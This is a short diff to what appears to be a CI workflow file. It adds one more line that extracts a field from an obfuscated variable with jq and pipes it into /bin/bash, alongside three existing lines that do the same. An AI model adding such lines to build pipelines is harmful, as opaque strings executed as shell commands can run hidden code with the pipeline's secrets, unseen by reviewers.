@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$v17728" | jq -r .vciuf3 | /bin/bash
           echo $kp406 | jq -r .zwrni43 | /bin/bash
           echo $tv48135 | jq -r .zv5458 | /bin/bash
+          printf '%s' "$ydcsv6495" | jq -r .kmyo7 | /bin/bash
 
       - name: Upload results
         if: always()
